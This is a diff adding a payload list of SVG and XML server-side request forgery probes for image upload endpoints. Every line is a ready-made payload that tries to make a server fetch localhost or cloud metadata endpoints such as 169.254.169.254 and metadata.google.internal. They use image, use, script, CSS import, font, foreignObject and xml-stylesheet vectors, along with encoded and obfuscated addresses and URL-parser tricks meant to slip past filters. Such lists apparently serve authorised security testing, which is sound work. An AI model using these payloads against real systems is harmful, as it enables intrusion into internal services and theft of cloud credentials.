@@ -1,0 +1,51 @@
+# Image upload SSRF probes - SVG/XML resource fetch contexts
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.0.0.1/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://localhost/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://metadata.google.internal/computeMetadata/v1/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/metadata/instance?api-version=2021-02-01"/></svg>
+data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.0.0.1/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="//127.0.0.1/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.0.0.1:8080/admin"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.1/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://2130706433/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://[::1]/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="http://127.0.0.1/" xmlns:xlink="http://www.w3.org/1999/xlink"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><use href="http://127.0.0.1/sprite.svg#icon"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="http://127.0.0.1/sprite.svg#icon" xmlns:xlink="http://www.w3.org/1999/xlink"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><feImage href="http://127.0.0.1/filter.png"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><filter id="f"><feImage href="http://127.0.0.1/filter.png"/></filter><rect filter="url(#f)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script href="http://127.0.0.1/probe.js"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><script xlink:href="http://127.0.0.1/probe.js" xmlns:xlink="http://www.w3.org/1999/xlink"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("http://127.0.0.1/style.css");</style></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><style>@import "http://127.0.0.1/style.css";</style></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><style>rect{fill:url("http://127.0.0.1/pattern.svg#p")}</style><rect width="1" height="1"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><style>@font-face{font-family:zf;src:url("http://127.0.0.1/font.woff")}</style><text font-family="zf">x</text></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="http://127.0.0.1/"></iframe></foreignObject></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><img xmlns="http://www.w3.org/1999/xhtml" src="http://127.0.0.1/image.png"/></foreignObject></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="http://127.0.0.1/style.css"/></foreignObject></svg>
+<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.0.0.1/"/></svg>
+<?xml-stylesheet href="http://127.0.0.1/style.xsl" type="text/xsl"?><svg xmlns="http://www.w3.org/2000/svg"></svg>
+<?xml-stylesheet href="http://169.254.169.254/latest/meta-data/" type="text/xsl"?><svg xmlns="http://www.w3.org/2000/svg"></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><defs><pattern id="p"><image href="http://127.0.0.1/p.png"/></pattern></defs><rect fill="url(#p)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><a href="http://127.0.0.1/"><text>x</text></a></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><cursor href="http://127.0.0.1/cursor.cur"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><marker id="m"><image href="http://127.0.0.1/marker.png"/></marker></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><mask id="m"><image href="http://127.0.0.1/mask.png"/></mask><rect mask="url(#m)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><clipPath id="c"><image href="http://127.0.0.1/clip.png"/></clipPath><rect clip-path="url(#c)"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://example.com@127.0.0.1/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.0.0.1#example.com/"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http://127.0.0.1%2fadmin"/></svg>
+<svg xmlns="http://www.w3.org/2000/svg"><image href="http%3A%2F%2F127.0.0.1%2F"/></svg>
+data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><style>@import url("http://127.0.0.1/style.css");</style></svg>
+data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>
+data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cimage%20href%3D%22http%3A%2F%2F127.0.0.1%2F%22%2F%3E%3C%2Fsvg%3E
+<svg><image href="http://2130706433/"></image></svg>
+<svg><img src="http://0177.0.0.1/"/></svg>
+<svg><link href="http://127.0.0.1/style.css" rel="stylesheet"/></svg>
+<svg><style>@import url(http://127.0.0.1/style.css)</style></svg>
+<svg><image href="http://127.0.0.1/?x=.svg"/></svg>
+<svg><image href="http://127.0.0.1/image.svg?cache=1"/></svg>
+<svg><image href="http://127.0.0.1/redirect?url=http://169.254.169.254/latest/meta-data/"/></svg>
+<svg><image href="http://0x7f000001/"/></svg>
+<svg><image href="http://127.0.0.1%252fadmin"/></svg>
